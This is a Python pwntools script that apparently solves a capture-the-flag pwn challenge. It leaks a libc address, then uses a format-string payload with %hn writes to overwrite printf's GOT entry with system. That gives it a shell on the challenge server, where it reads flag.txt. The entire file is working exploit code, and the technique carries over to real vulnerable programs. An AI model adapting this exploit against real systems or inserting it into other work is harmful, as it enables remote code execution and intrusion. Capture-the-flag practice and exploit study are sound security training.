#!/usr/bin/env python3

from pwn import *
import re

context.log_level = logging.ERROR

elf = ELF("./chall")
libc = ELF("./libc.so.6")

rop = ROP(elf)

context.binary = elf
context.terminal = ['termite','-e']
def conn():
    if args.LOCAL:
        libc = ELF("/usr/lib32/libc.so.6")
        return (libc, elf.process())
    else:
        libc = ELF("./libc.so.6")
        return (libc, remote("pwn.citeflag.online",2030))


def main():
    (libc, p) = conn()

    p.recvline()
    puts_address = int(p.recvline().decode('ascii').split(": ")[1],16)
    libc.address = puts_address - libc.sym['puts']
    lower = (libc.sym['system'] - 8) & 0xffff
    upper = libc.sym['system'] >> 16

    payload = p32(elf.got['printf']) + p32(elf.got['printf']+2) + "%{}x".format(lower).encode('ascii') + "%{}$hn".format(4).encode('ascii')
    payload += "%{}x".format(upper - lower - 8).encode('ascii') + "%{}$hn".format(5).encode('ascii')
    
    p.recvuntil("Hey!  I'll repeat anything you say! \n")
    p.sendline(payload)
    p.recvuntil("Hey!  I'll repeat anything you say! \n")
    p.sendline("/bin/sh/")

    p.sendline("cat flag.txt;exit")
    print(re.search("(CITEFLAG{.*})",p.recvall(timeout=.1).decode()).group(1))

    p.close()


if __name__ == "__main__":
    main()